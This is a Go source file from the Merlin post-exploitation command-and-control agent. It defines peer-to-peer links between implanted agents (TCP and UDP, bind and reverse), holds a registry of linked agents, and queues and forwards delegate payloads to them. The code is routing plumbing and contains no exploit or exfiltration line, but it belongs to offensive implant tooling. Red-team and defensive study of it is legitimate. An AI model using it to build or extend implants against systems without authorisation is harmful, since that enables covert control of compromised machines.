// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

// Package p2p is used for Agent based peer-to-peer communications
package p2p

import (
	// Standard
	"fmt"
	"net"
	"sync"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
)

// Types of Peer-to-peer Agents
const (
	TCPBIND    = 0
	TCPREVERSE = 1
	UDPBIND    = 2
	UDPREVERSE = 3
)

// LinkedAgents is a map that holds information about peer-to-peer connected agents for receiving & routing messages
var LinkedAgents = sync.Map{}

// out a global map of Delegate messages that are outgoing from this Agent to its parent or the server
var out = make(chan messages.Delegate, 100)

// Agent holds information about peer-to-peer linked agents
type Agent struct {
	In     chan messages.Base // In a channel of incoming Base messages coming in from the linked Agent
	Out    chan messages.Base // Out a channel of outgoing Base messages to be sent to the linked Agent
	Conn   interface{}        // Conn the network connection used to communicate with the linked Agent
	Type   int                // Type of the linked Agent (e.g., tcp-bind, SMB, etc.)
	Remote net.Addr           // Remote is the name or address of the remote Agent data is being sent to
}

// GetDelegateMessages infinitely loops through the global Delegate message channel and return a list of them
func GetDelegateMessages() (messages []messages.Delegate) {
	// Check the output channel
	for {
		if len(out) > 0 {
			msg := <-out
			messages = append(messages, msg)
		} else {
			break
		}
	}
	return
}

// AddDelegateMessage places an incoming Delegate message into the global out channel
func AddDelegateMessage(msg messages.Delegate) {
	// Convert to Job and add it to the queue
	out <- msg
}

// HandleDelegateMessages takes in a list of incoming Delegate messages
func HandleDelegateMessages(delegates []messages.Delegate) {
	cli.Message(cli.DEBUG, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): received %d delegate messages", len(delegates)))

	for _, delegate := range delegates {
		agent, ok := LinkedAgents.Load(delegate.Agent)
		if !ok {
			cli.Message(cli.WARN, fmt.Sprintf("%s is not a known linked agent\n", delegate.Agent))
			break
		}
		var n int
		var err error
		switch agent.(Agent).Type {
		case TCPBIND, TCPREVERSE, UDPBIND:
			n, err = agent.(Agent).Conn.(net.Conn).Write(delegate.Payload)
		case UDPREVERSE:
			n, err = agent.(Agent).Conn.(net.PacketConn).WriteTo(delegate.Payload, agent.(Agent).Remote)
		default:
			cli.Message(cli.WARN, fmt.Sprintf("p2p.HandleDelegateMessages() unhandled Agent type: %d", agent.(Agent).Type))
			break
		}

		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("clients/p2p.HandleDelegateMessages(): there was an error writing a message to the linked agent %s: %s\n", agent.(Agent).Conn.(net.Conn).RemoteAddr(), err))

		}
		cli.Message(cli.NOTE, fmt.Sprintf("Wrote %d bytes to the linked agent %s at %s\n", n, delegate.Agent, agent.(Agent).Remote))
	}
}

// Returns the Agent's type as a string
func (a *Agent) String() string {
	switch a.Type {
	case TCPBIND:
		return "tcp-bind"
	case TCPREVERSE:
		return "tcp-reverse"
	case UDPBIND:
		return "udp-bind"
	case UDPREVERSE:
		return "udp-reverse"
	default:
		return fmt.Sprintf("unknown peer-to-peer agent type %d", a.Type)
	}
}
